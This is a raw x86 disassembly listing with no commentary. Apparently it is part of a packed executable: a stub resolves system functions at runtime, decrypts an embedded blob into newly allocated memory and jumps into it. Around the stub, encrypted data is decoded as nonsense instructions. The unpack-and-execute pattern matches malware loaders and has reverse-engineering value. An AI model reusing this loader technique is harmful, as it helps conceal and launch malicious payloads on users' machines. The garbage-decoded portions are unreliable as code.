  421356:	sbb    eax,0xd6e0da8d
  42135b:	mov    eax,ds:0xa10ccd47
  421360:	xchg   esi,eax
  421361:	or     DWORD PTR [esp+eiz*8+0x72792638],edi
  421368:	jb     0x4212ea
  42136a:	or     esp,DWORD PTR [esp+ebx*2]
  42136d:	xor    eax,0xd9be90fe
  421372:	es sbb eax,0x712eaa5a
  421378:	fld    TBYTE PTR [edx-0x7d]
  42137b:	addr16 hlt 
  42137d:	imul   edi,eax,0xffffff85
  421380:	or     al,BYTE PTR [eax+0x1340869a]
  421386:	or     dh,BYTE PTR [eax+0x52]
  421389:	mov    esp,0xddb6411
  42138e:	inc    ebx
  42138f:	mov    esp,0x23e132f2
  421394:	data16 sub BYTE PTR [eax-0x6867109d],cl
  42139b:	scas   eax,DWORD PTR es:[edi]
  42139c:	push   edi
  42139d:	stos   BYTE PTR es:[edi],al
  42139e:	popa   
  42139f:	push   esp
  4213a0:	stos   DWORD PTR es:[edi],eax
  4213a1:	fstp   QWORD PTR gs:[edi]
  4213a4:	pop    eax
  4213a5:	sbb    edi,DWORD PTR [eax]
  4213a7:	ret    
  4213a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213a9:	xchg   ebp,eax
  4213aa:	sbb    DWORD PTR [esi-0x48],ebx
  4213ad:	fcomp  st(2)
  4213af:	mov    DWORD PTR [ebp-0x60],esp
  4213b2:	scas   al,BYTE PTR es:[edi]
  4213b3:	and    al,0xff
  4213b5:	gs test eax,0xc0b74121
  4213bb:	inc    edi
  4213bc:	shl    BYTE PTR [ecx+0x3f1a8f1a],1
  4213c2:	or     esp,DWORD PTR [ebx+0x56dd2ccc]
  4213c8:	sub    BYTE PTR [ebx+0x25056850],dl
  4213ce:	sti    
  4213cf:	add    al,0x58
  4213d1:	call   0xc3226040
  4213d6:	(bad)  [bx+si]
  4213d9:	div    DWORD PTR ds:0x77463cdf
  4213df:	xor    DWORD PTR [ebx-0x716f602],esp
  4213e5:	pop    esp
  4213e6:	push   ebp
  4213e7:	int3   
  4213e8:	jmp    0x4213c0
  4213ea:	inc    ecx
  4213eb:	shl    BYTE PTR [ebx-0x28],1
  4213ee:	mov    esp,0xe4b21290
  4213f3:	pop    edx
  4213f4:	loopne 0x421464
  4213f6:	arpl   sp,sp
  4213f8:	hlt    
  4213f9:	(bad)  
  4213fb:	push   ds
  4213fc:	add    al,bl
  4213fe:	cmc    
  4213ff:	rol    DWORD PTR [edx-0x1a],0x2b
  421403:	jmp    0x4213c6
  421405:	clc    
  421406:	fs stc 
  421408:	push   ss
  421409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42140a:	addr16 jg 0x4213dd
  42140d:	xor    BYTE PTR [ebp+ecx*4-0x4a],ch
  421411:	ds dec esi
  421413:	dec    ecx
  421414:	mov    ebx,0x92dd9743
  421419:	mov    BYTE PTR [edi],al
  42141b:	(bad)  
  42141c:	jns    0x4213dc
  42141e:	jbe    0x421441
  421420:	dec    edi
  421421:	cmp    al,BYTE PTR [edx]
  421423:	jmp    0x421448
  421425:	mov    ds:0x1776b25c,al
  42142a:	push   ebp
  42142b:	mov    esp,0x9a6e7528
  421430:	adc    eax,0x9210d689
  421435:	mov    ebx,0xae7c8dde
  42143a:	jp     0x42142b
  42143c:	inc    ebp
  42143d:	cmp    al,0x11
  42143f:	das    
  421440:	jecxz  0x4213f8
  421442:	and    ah,ch
  421444:	inc    edx
  421445:	xchg   DWORD PTR [edx-0x1225a255],edi
  42144b:	and    edi,ebp
  42144d:	pop    ebp
  42144e:	retf   
  42144f:	into   
  421450:	data16 sub BYTE PTR [edi+ebx*8-0x56],dl
  421455:	xlat   BYTE PTR ds:[ebx]
  421456:	sti    
  421457:	hlt    
  421458:	int3   
  421459:	jmp    FWORD PTR [edi-0x5f]
  42145c:	sbb    eax,0x88dc1a2
  421461:	xchg   ebx,eax
  421462:	pop    edx
  421463:	pop    ebx
  421464:	mov    DWORD PTR [ecx-0x73],edx
  421467:	idiv   BYTE PTR [edx-0x4f041ffb]
  42146d:	cmp    DWORD PTR [ebp-0x7be947ce],ebp
  421473:	mov    edx,0xa1e6d67e
  421478:	dec    esi
  421479:	in     eax,dx
  42147a:	or     al,0x81
  42147c:	xor    edx,DWORD PTR [edi]
  42147e:	push   0xc98d68d3
  421483:	pop    ebp
  421484:	daa    
  421485:	sub    eax,0x61264900
  42148a:	js     0x42144d
  42148c:	mov    eax,ds:0x57ac5e54
  421491:	bound  eax,QWORD PTR [edx+0x5ed9b27c]
  421497:	inc    ebp
  421498:	fisubr WORD PTR [edx-0x2f6edf03]
  42149e:	mov    al,0x22
  4214a0:	sar    ebx,cl
  4214a2:	adc    al,0xc6
  4214a4:	fcmovnu st,st(5)
  4214a6:	xchg   esi,eax
  4214a7:	arpl   dx,sp
  4214a9:	pop    edi
  4214aa:	sbb    eax,0x9f867eea
  4214af:	out    0xa3,eax
  4214b1:	adc    eax,0xa218fb3b
  4214b6:	fsubr  DWORD PTR [edi-0x5d]
  4214b9:	add    DWORD PTR [ebp-0x23e44cc7],edx
  4214bf:	or     eax,DWORD PTR [edi+eax*2-0x4a]
  4214c3:	aad    0xe5
  4214c5:	rcl    BYTE PTR [edi],1
  4214c7:	dec    esp
  4214c8:	mov    edx,0x90c3c033
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0xe36598fd
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0xcac3a577
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	jmp    DWORD PTR [esi]
  42182f:	mov    ds:0x739eb9e4,al
  421834:	test   BYTE PTR [edi],bh
  421836:	jae    0x421885
  421838:	imul   ecx,DWORD PTR [eax],0x74f89418
  42183e:	add    DWORD PTR [ebp+0x773f8473],ebx
  421844:	dec    ebp
  421845:	imul   ecx,DWORD PTR [eax-0x19],0xb974f86b
  42184c:	popf   
  42184d:	jae    0x4217d3
  42184f:	aas    
  421850:	ja     0x42189f
  421852:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421858:	mov    ecx,0x3f84739d
  42185d:	ja     0x4218ac
  42185f:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421865:	mov    ecx,0x3f84739d
  42186a:	(bad)  
  42186b:	dec    ebp
  42186c:	imul   ecx,DWORD PTR [eax],0x7a4274e9
  421872:	mov    ecx,0x1e497a29
  421877:	iret   
  421878:	dec    esp
  421879:	and    eax,0x903fc6c5
  42187e:	sbb    eax,0xf603bdca
  421883:	push   eax
  421884:	adc    BYTE PTR [edi],bh
  421886:	or     BYTE PTR [ebp-0x39],ah
  421889:	or     BYTE PTR [ecx+0x7f2d71a],bl
  42188f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421890:	pop    ebp
  421891:	adc    ch,BYTE PTR [ebp+0x1b]
  421894:	jge    0x42181f
  421896:	dec    ebx
  421897:	xchg   ecx,eax
  421898:	sbb    bl,BYTE PTR [ecx+0x1fd73cd9]
  42189e:	sbb    ah,BYTE PTR [edx]
  4218a0:	or     eax,0xf566c96d
  4218a5:	jle    0x421844
  4218a7:	popf   
  4218a8:	jae    0x42182e
  4218aa:	aas    
  4218ab:	ja     0x4218fa
  4218ad:	imul   ecx,DWORD PTR [edi],0x37a1977e
  4218b3:	inc    ecx
  4218b4:	vmwrite eax,edi
  4218b7:	(bad)  
  4218b8:	in     eax,0x47
  4218ba:	sub    dh,al
  4218bc:	jne    0x42191f
  4218be:	mov    al,ds:0x2c97b511
  4218c3:	jl     0x421872
  4218c5:	jge    0x4218dc
  4218c7:	or     al,0x30
  4218c9:	in     eax,dx
  4218ca:	test   eax,0xc5b3e600
  4218cf:	push   ss
  4218d0:	mov    ebp,0xfbb51f35
  4218d5:	add    cl,bl
  4218d7:	in     eax,0xc1
  4218d9:	jle    0x4218da
  4218db:	gs loope 0x42186c
  4218de:	jne    0x4218d7
  4218e0:	pop    esp
  4218e1:	arpl   WORD PTR [edx+0x1f],ax
  4218e4:	stc    
  4218e5:	repnz cmp DWORD PTR ds:[ecx+edi*2+0x47e5c7dc],ebx
  4218ee:	sub    dh,al
  4218f0:	je     0x421953
  4218f2:	ror    BYTE PTR [ebp+0x5ccc972b],1
  4218f8:	mov    edi,0x9a91007d
  4218fd:	in     eax,dx
  4218fe:	xor    ebx,DWORD PTR [ebp-0x746a4cb7]
  421904:	push   ss
  421905:	xor    eax,0x261282f
  42190a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42190b:	xchg   ebx,eax
  42190c:	push   0x7e
  42190e:	loope  0x421908
  421910:	jl     0x4218a0
  421912:	jge    0x4218a3
  421914:	fbld   TBYTE PTR [ebx+0x5a]
  421917:	mov    cs,WORD PTR [eax]
  421919:	nop
  42191a:	aaa    
  42191b:	inc    ecx
  42191c:	vmwrite eax,DWORD PTR [edi+edi*1+0x8694d77]
  421924:	out    0x6b,eax
  421926:	test   al,0x31
  421928:	mov    ecx,0x3d853f9d
  42192d:	ja     0x42191c
  42192f:	mov    ecx,0xf86ba863
  421934:	je     0x4218ef
  421936:	popf   
  421937:	jae    0x4218bd
  421939:	aas    
  42193a:	xchg   edi,eax
  42193b:	dec    ebp
  42193c:	push   0x9
  42193e:	in     al,dx
  42193f:	push   0xfffffff2
  421941:	je     0x4218fc
  421943:	jae    0x4219bc
  421945:	test   BYTE PTR [edi],bh
  421947:	retf   
  421948:	dec    ebx
  421949:	imul   ecx,DWORD PTR [eax],0x65f86be7
  42194f:	add    al,0x9d
  421951:	jae    0x4218d7
  421953:	das    
  421954:	ja     0x4219a3
  421956:	imul   ecx,DWORD PTR [eax],0x74f86be2
  42195c:	clc    
  42195d:	popf   
  42195e:	jae    0x4218f4
  421960:	aas    
  421961:	ja     0x4219b0
  421963:	imul   ecx,DWORD PTR [eax],0xffffffe7
  421966:	outs   dx,BYTE PTR ds:[esi]
  421967:	clc    
  421968:	jne    0x421923
  42196a:	popf   
  42196b:	jae    0x4218f1
  42196d:	aas    
  42196e:	jb     0x4219bd
  421970:	push   0xf86be708
  421975:	je     0x421930
  421977:	int    0x7f
  421979:	test   BYTE PTR [edi],bh
  42197b:	jae    0x4219ca
  42197d:	imul   ecx,DWORD PTR [ecx],0x76f86e03
  421983:	mov    ecx,0x3f84f39d
  421988:	addr16 dec ebp
  42198a:	imul   ebx,DWORD PTR [eax],0x74f86be7
  421990:	test   eax,0x3f94739d
  421995:	ja     0x4219e4
  421997:	imul   ecx,DWORD PTR [eax],0x74f87be7
  42199d:	mov    ecx,0x3f84739d
  4219a2:	ja     0x4219f1
  4219a4:	imul   ecx,DWORD PTR [eax],0x74f45213
  4219aa:	rcr    BYTE PTR [esi-0x78c07b8d],1
  4219b0:	inc    esi
  4219b1:	imul   eax,DWORD PTR [edi-0x52],0xb974f86b
  4219b8:	popf   
  4219b9:	jae    0x42193f
  4219bb:	aas    
  4219bc:	ja     0x421a0b
  4219be:	imul   ecx,DWORD PTR [eax],0x74f86be7
  4219c4:	mov    ecx,0x3f84739d
  4219c9:	ja     0x421a18
  4219cb:	imul   ecx,DWORD PTR [eax],0x74f86be7
  4219d1:	mov    ecx,0x3f84739d
  4219d6:	ja     0x421a25
  4219d8:	imul   ecx,DWORD PTR [eax],0x74f86be7
  4219de:	mov    ecx,0x3f84739d
  4219e3:	ja     0x421a32
  4219e5:	imul   ecx,DWORD PTR [eax],0x74f86be7
  4219eb:	mov    ecx,0x3f84739d
  4219f0:	ja     0x421a3f
  4219f2:	imul   ecx,DWORD PTR [eax],0x74f86be7
  4219f8:	mov    ecx,0x3f84739d
  4219fd:	ja     0x421a4c
  4219ff:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421a05:	mov    ecx,0x3f84739d
  421a0a:	ja     0x421a59
  421a0c:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421a12:	mov    ecx,0x3f84739d
  421a17:	ja     0x421a66
  421a19:	imul   ecx,DWORD PTR [eax],0x5af86be7
  421a1f:	int    0xf8
  421a21:	or     esi,eax
  421a23:	aas    
  421a24:	ja     0x421a73
  421a26:	imul   ebp,eax,0x64f86bec
  421a2c:	mov    ecx,0x3b50739d
  421a31:	ja     0x421a80
  421a33:	ins    DWORD PTR es:[edi],dx
  421a34:	or     bh,ah
  421a36:	cmp    edi,DWORD PTR [ebp+0x3cc98b37]
  421a3c:	test   BYTE PTR [edi],bh
  421a3e:	ja     0x421a8d
  421a40:	imul   ecx,DWORD PTR [eax],0x94f86bc7
  421a46:	xchg   edi,eax
  421a47:	out    dx,eax
  421a48:	add    dh,dh
  421a4a:	pop    esp
  421a4b:	ja     0x421a9a
  421a4d:	imul   ecx,DWORD PTR [eax],0x74f86b87
  421a53:	dec    ecx
  421a54:	xchg   esi,eax
  421a55:	jae    0x4219db
  421a57:	gs ja  0x421aa7
  421a5a:	imul   edx,eax,0x74f86be3
  421a60:	mov    ecx,0x3f84739d
  421a65:	ja     0x421ab4
  421a67:	imul   ecx,DWORD PTR [eax],0x74f84be7
  421a6d:	pop    ecx
  421a6e:	popf   
  421a6f:	jae    0x4219f5
  421a71:	aas    
  421a72:	ja     0x421ac1
  421a74:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421a7a:	mov    ecx,0x3f84739d
  421a7f:	ja     0x421ace
  421a81:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421a87:	mov    ecx,0x3f84739d
  421a8c:	ja     0x421adb
  421a8e:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421a94:	mov    ecx,0x3f84739d
  421a99:	ja     0x421ae8
  421a9b:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421aa1:	mov    ecx,0x3f84739d
  421aa6:	ja     0x421af5
  421aa8:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421aae:	mov    ecx,0x3f84739d
  421ab3:	ja     0x421b02
  421ab5:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421abb:	mov    ecx,0x3f84739d
  421ac0:	ja     0x421b0f
  421ac2:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421ac8:	mov    ecx,0x3f84739d
  421acd:	ja     0x421b1c
  421acf:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421ad5:	mov    ecx,0x3f84739d
  421ada:	ja     0x421b29
  421adc:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421ae2:	mov    ecx,0x3f84739d
  421ae7:	ja     0x421b36
  421ae9:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421aef:	mov    ecx,0x3f84739d
  421af4:	ja     0x421b43
  421af6:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421afc:	mov    ecx,0x3f84739d
  421b01:	ja     0x421b50
  421b03:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b09:	mov    ecx,0x3f84739d
  421b0e:	ja     0x421b5d
  421b10:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b16:	mov    ecx,0x3f84739d
  421b1b:	ja     0x421b6a
  421b1d:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b23:	mov    ecx,0x3f84739d
  421b28:	ja     0x421b77
  421b2a:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b30:	mov    ecx,0x3f84739d
  421b35:	ja     0x421b84
  421b37:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b3d:	mov    ecx,0x3f84739d
  421b42:	ja     0x421b91
  421b44:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b4a:	mov    ecx,0x3f84739d
  421b4f:	ja     0x421b9e
  421b51:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b57:	mov    ecx,0x3f84739d
  421b5c:	ja     0x421bab
  421b5e:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b64:	mov    ecx,0x3f84739d
  421b69:	ja     0x421bb8
  421b6b:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b71:	mov    ecx,0x3f84739d
  421b76:	ja     0x421bc5
  421b78:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b7e:	mov    ecx,0x3f84739d
  421b83:	ja     0x421bd2
  421b85:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b8b:	mov    ecx,0x3f84739d
  421b90:	ja     0x421bdf
  421b92:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421b98:	mov    ecx,0x3f84739d
  421b9d:	ja     0x421bec
  421b9f:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421ba5:	mov    ecx,0x3f84739d
  421baa:	ja     0x421bf9
  421bac:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421bb2:	mov    ecx,0x3f84739d
  421bb7:	ja     0x421c06
  421bb9:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421bbf:	mov    ecx,0x3f84739d
  421bc4:	ja     0x421c13
  421bc6:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421bcc:	mov    ecx,0x3f84739d
  421bd1:	ja     0x421c20
  421bd3:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421bd9:	mov    ecx,0x3f84739d
  421bde:	ja     0x421c2d
  421be0:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421be6:	mov    ecx,0x3f84739d
  421beb:	ja     0x421c3a
  421bed:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421bf3:	mov    ecx,0x3f84739d
  421bf8:	ja     0x421c47
  421bfa:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421c00:	mov    ecx,0x3f84739d
  421c05:	ja     0x421c54
  421c07:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421c0d:	mov    ecx,0x3f84739d
  421c12:	ja     0x421c61
  421c14:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421c1a:	mov    ecx,0x3f84739d
  421c1f:	ja     0x421c6e
  421c21:	imul   ecx,DWORD PTR [eax],0x74f86be7
  421c27:	mov    ecx,0x3f84739d
  421c2c:	ja     0x421c7b
  421c2e:	push   es
  421c2f:	mov    al,ds:0x74d76bec
  421c34:	mov    ecx,0x1584738d
  421c39:	aad    0x97
  421c3b:	sbb    BYTE PTR [esi+0x18],ch
  421c3e:	inc    esi
  421c3f:	repz jmpw 0x61b4
  421c44:	ins    BYTE PTR es:[edi],dx
  421c45:	sub    al,0xc3
  421c47:	fmul   DWORD PTR [edi]
  421c49:	jns    0x421cae
  421c4b:	xor    ebx,ebp
  421c4d:	lds    ecx,FWORD PTR [esi]
  421c4f:	mov    ebx,DWORD PTR [esi]
  421c51:	pusha  
  421c52:	mov    ch,0xf6
  421c54:	mov    eax,DWORD PTR [edi+0x6a]
  421c57:	ja     0x421cad
  421c59:	rol    DWORD PTR [edi-0xa],0x2c
  421c5d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  421c5f:	aas    
  421c60:	push   eax
  421c61:	jmp    0x4651:0x6b65de1
  421c68:	test   BYTE PTR [eax+0x67],al
  421c6b:	xor    eax,0x4d93785f
  421c70:	mov    bl,0xab
  421c72:	mov    eax,0x3415b3d
  421c77:	jns    0x421ce4
  421c79:	pop    ebx
  421c7a:	push   edi
  421c7b:	out    dx,al
  421c7c:	data16 stc 
  421c7e:	dec    ebp
  421c7f:	inc    esi
